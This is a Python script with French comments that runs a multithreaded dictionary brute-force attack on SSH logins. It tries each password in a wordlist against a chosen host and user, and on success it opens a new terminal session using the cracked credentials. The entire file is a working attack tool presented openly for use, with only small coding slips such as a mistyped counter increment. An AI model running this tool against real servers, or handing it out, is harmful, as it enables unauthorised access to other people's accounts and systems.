import paramiko #librairie pour la connexion en ssh
import threading
import argparse
import sys
import os
from sys import platform
from progressbar import *


pythonenv = ""
activatenv = ""
if('env' not in sys.exec_prefix and 'venv' not in sys.exec_prefix):
    print("Environnement virtuel non detecté")
    sys.exit()
if platform == "linux" or platform == "linux2":
    pythonenv = sys.exec_prefix+"/bin/python3"
    activatenv = sys.exec_prefix+"/bin/activate"
elif platform == "win32":
    pythonenv = sys.exec_prefix+"\\Scripts\\python.exe"
    activatenv = sys.exec_prefix+"\\Scripts\\activate.bat"

#fonciton qui me permet de compter le nombre de ligne dans mon fichier de mot de passe
def compteur(fichier):
    file = open(fichier, "r")
    line_count = 0
    for line in file:
        if line != "\n": #toute ligne non vide est comptabilisée
            line_count += 1
    file.close()
    return line_count

# fonction qui permet de réaliser la connexion ssh
def sshconnect(number, host, user, password):
    global MaListe #on récupere les variables globales Maliste et count
    global count
    global flag
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy()) #on force le client a se connecter au serveur meme si il ne le connait pas
    try:
        client.connect(host, username=user, password=password)#connexion ssh avec le mot de passe si on trouve le mot de passe on l'affiche a l'écran et on l'écrit dans un fichier
        if platform == "linux" or platform == "linux2":
            os.system("gnome-terminal --tab -- "+pythonenv+" "+sys.exec_prefix+"/../connectSsh.py "+host+" 22 "+user+" "+password)
        elif platform == "win32":
            #ouvre un nouveau terminal qui se coupe une fois le programme fini
            os.system("start cmd /c \""+activatenv+" && "+pythonenv+" "+sys.exec_prefix+"\\..\\connectSsh.py "+host+" 22 "+user+" "+password+"\"")
            #ouvre un nouveau terminal et le laisse ouvert (mode debug)
            #os.system("start cmd /k \""+activatenv+" && "+pythonenv+" "+sys.exec_prefix+"\\..\\connectSsh.py "+host+" 22 "+user+" "+password+"\"")
        flag = True
    except paramiko.ssh_exception.AuthenticationException:
        pass

    except paramiko.ssh_exception.SSHException:
        print("overflow")

    if round(number, 0) not in MaListe: #number est le pourcentage du travail accompli, on garde seulement la partie entiere et si il est pas encore présent on l'ajoute dans la liste
        MaListe.append(round(number, 0))

    client.close()

count = 0 #varible permettant de faire avancer le pourcentage
MaListe = [] #liste des pourcents effectuée
flag = False

parser = argparse.ArgumentParser() #parsing des arguments
parser.add_argument("host", help="cible de l'attaque (ip)")
parser.add_argument("user", help="utilisateur auquel se connecter")
parser.add_argument("dictionnaire", help="dictionnaire d'attaque")
args = parser.parse_args()

line_count = compteur(args.dictionnaire)# nombre de lignes du fichier
widgets = ['Test: ', Percentage(), ' ', Bar(marker='#', left='[', right=']'),
               ' ']  #options de barre de chargement

pbar = ProgressBar(widgets=widgets, maxval=100) #création de la barre
pbar.start()

file = open(args.dictionnaire, "r")
for number, line in enumerate(file.readlines()):
    if flag == False :
        pourcentage: float = number / line_count * 100 #pourcentage en float du total parcouru ATTENTION la donnée n'est pas encore traitée
        x = threading.Thread(target=sshconnect, args=(pourcentage, args.host, args.user, line.strip())) #création du multi threading
        x.start() # démarrage du multi threading
        time.sleep(1) # on pause le programme pour 3 dixieme de seconde sinon le serveur ssh ne repond plus car trop de requete il y a du déni de service
        if len(MaListe) > count: #Ca permet de savoir quand il faut ajouter un pourcentage à la barre de chargement
            try:
                pbar.update(len(MaListe))#update de la barre avec la nouvelle longueue
            except ValueError:
                pass
            count =+ 1 #on ajoute 1 a count pour qu'il se retorouve au meme niveau que la liste Maliste
file.close()
pbar.finish()
